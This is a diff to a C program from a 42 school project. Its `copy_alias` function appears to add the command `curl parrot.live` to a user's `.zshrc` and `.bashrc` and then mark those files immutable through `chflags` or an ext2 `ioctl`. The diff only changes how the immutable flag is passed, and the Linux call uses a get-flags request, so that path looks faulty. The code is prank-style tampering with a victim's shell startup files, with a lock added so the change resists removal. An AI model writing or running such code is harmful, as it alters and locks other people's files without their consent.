@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
-/*   Updated: 2023/06/22 03:31:33 by mgama            ###   ########.fr       */
+/*   Updated: 2023/06/22 03:32:06 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -51,11 +51,13 @@ int	copy_alias(char **envp)
 {
 	int			i;
 	int			fd;
+	int			flags;
 	char		*path;
 	static char	*command = "curl parrot.live";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 
 	(void)(envp);
+	flags = 0;
 	printf("\033[36mStart shell rc modifications...\033[0m\n");
 	i = -1;
 	while (file_list[++i])
@@ -73,7 +75,8 @@ int	copy_alias(char **envp)
 		if (chflags(path, UF_IMMUTABLE) < 0)
 			return (dprintf(2, "Could not execute ioctl on file %s", path), 1);
 		#else
-		if (ioctl(fd, EXT2_IOC_GETFLAGS, EXT2_IMMUTABLE_FL) < 0)
+		flags |= EXT2_IMMUTABLE_FL;
+		if (ioctl(fd, EXT2_IOC_GETFLAGS, &flags) < 0)
 			return (dprintf(2, "Could not execute ioctl on file %s", path), 1);
 		#endif
 		close(fd);
